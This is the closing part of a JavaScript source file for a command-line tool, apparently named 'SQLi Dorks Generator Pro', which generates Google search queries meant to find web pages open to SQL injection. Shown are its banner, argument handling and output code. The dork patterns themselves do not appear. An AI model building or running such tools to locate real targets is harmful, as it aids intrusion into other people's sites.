║  ░░██▒██▓ ░▒████▒░██▓ ▒██▒▒██▒   ░██▒░▒████▒▒██▒ ░  ░  ▒██▒ ░ ▒██████▒▒░██║          ║
║  ░ ▓░▒ ▒  ░░ ▒░ ░░ ▒▓ ░▒▓░░ ▒░   ░  ░░░ ▒░ ░▒▓▒░ ░  ░  ▒ ░░   ▒ ▒▓▒ ▒ ░░▓  ║
║    ▒ ░ ░   ░ ░  ░  ░▒ ░ ▒░░  ░      ░ ░ ░  ░░▒ ░         ░    ░  ░▒  ░ ░ ▒ ░║
║    ░   ░     ░     ░░   ░ ░      ░      ░   ░░         ░ ░    ░  ░  ░   ▒ ░║
║      ░       ░  ░   ░            ░      ░  ░                       ░   ░   ║
║                                                                           ║
║        SQLI DORKS GENERATOR PRO - ADVANCED GOOGLE HACKING                 ║
║   Multi-Category | Auto-Generation | Google Operators | Custom Patterns   ║
╚═══════════════════════════════════════════════════════════════════════════════════════╝
    `);
  }
}

// CLI Interface
if (require.main === module) {
  const args = process.argv.slice(2);
  
  if (args.length < 1) {
    console.log('Usage: node sqli-dorks-generator.js <keyword> [count] [output]');
    console.log('Example: node sqli-dorks-generator.js "login.php" 100 dorks.txt');
    process.exit(1);
  }

  const keyword = args[0];
  const count = parseInt(args[1]) || 50;
  const outputFile = args[2];

  const generator = new SQLiDorksGenerator();
  generator.printBanner();

  try {
    const result = generator.generateDorks(keyword, count);
    
    console.log('\n' + '='.repeat(60));
    console.log('SQL INJECTION DORKS GENERATION RESULTS');
    console.log('='.repeat(60));
    console.log(`Keyword: ${result.keyword}`);
    console.log(`Total Dorks Generated: ${result.count}`);
    console.log(`Categories: ${result.categories.join(', ')}`);
    console.log('\nGenerated Dorks:');
    result.dorks.forEach((dork, index) => {
      console.log(`${index + 1}. ${dork}`);
    });

    if (outputFile) {
      generator.saveDorks(result, outputFile);
    }

    // Output JSON result
    console.log(JSON.stringify({
      tool: "sqli-dorks-generator",
      timestamp: new Date().toISOString(),
      keyword: result.keyword,
      count: result.count,
      categories: result.categories,
      dorks: result.dorks
    }, null, 2));

  } catch (error) {
    console.error('[!] Error:', error instanceof Error ? error.message : 'Unknown error');
    process.exit(1);
  }
}

export { SQLiDorksGenerator, DorkCategory, DorkResult };